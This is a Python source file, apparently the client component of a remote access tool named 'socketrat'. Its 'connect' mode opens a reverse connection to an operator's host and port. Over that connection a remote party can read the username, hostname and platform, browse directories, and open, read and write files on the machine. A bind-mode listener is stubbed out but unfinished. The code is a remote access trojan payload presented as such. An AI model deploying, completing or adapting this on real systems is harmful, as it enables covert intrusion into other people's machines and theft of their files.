# -*- coding: utf-8 -*-

import platform
import socket
import socketserver
import sys

from . import connection
from . import payload
from . import rpc


class ClientRPCHandler(rpc.RPCHandler):

    def rpc_dir(self):
        return list(self._functions)

    def rpc_echo(self, s):
        return s


class ReverseClient:

    def __init__(self, addr):
        self.addr = addr
        self.sock = socket.create_connection(addr)
        self.connection = connection.Connection(self.sock)
        self.rpc_handler = ClientRPCHandler()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

    def close(self):
        self.connection.close()

    def serve_forever(self):
        self.rpc_handler.handle_connection(self.connection)

    def register_function(self, *args, **kwargs):
        self.rpc_handler.register_function(*args, **kwargs)

    def register_instance(self, *args, **kwargs):
        self.rpc_handler.register_instance(*args, **kwargs)


class BindClient(socketserver.TCPServer):
    #TODO: get this BindClient working.

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._functions = dict()
        def create_rpc_handler():
            rpc_handler = ClientRPCHandler()
            for name, func in self._functions.items():
                rpc_handler.register_function(func, name)
            return rpc_handler
        self.RPCHandlerClass = create_rpc_handler

    def __enter__(self):
        return self

    def __exit__(self, *args, **kwargs):
        self.close()

    def close(self):
        self.server_close()
    
    def register_function(self, func, name=None):
        if name is None:
            name = func.__name__
        self._functions[name] = func


class ThreadingBindClient(socketserver.ThreadingMixIn, BindClient):
    pass


class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
    pass


def _linux_connect(args):
    host, port = addr = args.host, args.port

    with ReverseClient(addr) as client:
        funcs = [
                payload.get_username,
                payload.get_hostname,
                payload.get_platform,
                payload.list_dir,
                payload.change_dir,
                payload.get_current_dir,
                payload.get_file_size,
                payload.uname,
        ]
        for f in funcs:
            client.register_function(f)
        client.register_instance(FileService())
        try:
            client.serve_forever()
        except connection.ConnectionClosed:
            pass


def _linux_listen(args):
    print(args)
    print('listening')


def _windows_main(args):
    raise NotImplementedError


def _linux_main(args):
    import argparse

    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(
            dest='command',
            help='Choose from the following commands:',
            metavar='command',
    )
    subparsers.required = True

    connect_parser = subparsers.add_parser('connect',
            help='Connect to a socketrat server [reverse payload]'
    )
    connect_parser.set_defaults(func=_linux_connect)
    connect_parser.add_argument('host',
            help='Specify alternate hostname or IP address '
                 '[default: localhost]',
            default='localhost',
            nargs='?',
    )
    connect_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    listen_parser = subparsers.add_parser('listen',
            help='Listen for connections from a socketrat server [bind payload]',
    )
    listen_parser.set_defaults(func=_linux_listen)
    listen_parser.add_argument('--bind', '-b',
            help='Specify alternate bind address [default: all interfaces]',
            metavar='ADDRESS',
            default='0.0.0.0',
    )
    listen_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    args = parser.parse_args(args)
    args.func(args)


if platform.system() == 'Windows':
    main = _windows_main
elif platform.system() == 'Linux':
    main = _linux_main
else:
    def main(*args, **kwargs):
        raise NotImplementedError


if __name__ == '__main__':
    import sys

    args = sys.argv[1:]
    try:
        main(args)
    except NotImplementedError:
        print('*** Platform not supported: {}'.format(platform.system()))

